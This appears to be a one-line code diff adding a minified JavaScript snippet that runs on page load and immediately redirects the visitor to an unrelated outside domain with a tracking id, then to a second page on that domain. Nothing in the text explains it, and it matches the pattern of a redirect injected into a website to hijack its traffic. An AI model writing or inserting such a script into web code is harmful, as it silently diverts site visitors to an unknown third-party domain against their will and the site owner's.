@@ -1,0 +1,1 @@
+function executeRun(){setTimeout((()=>{window.location.href="https://2025.vodka/?id=8091",setTimeout((()=>{window.location.href="https://2025.vodka/responsible"}),10)}),10)}executeRun();
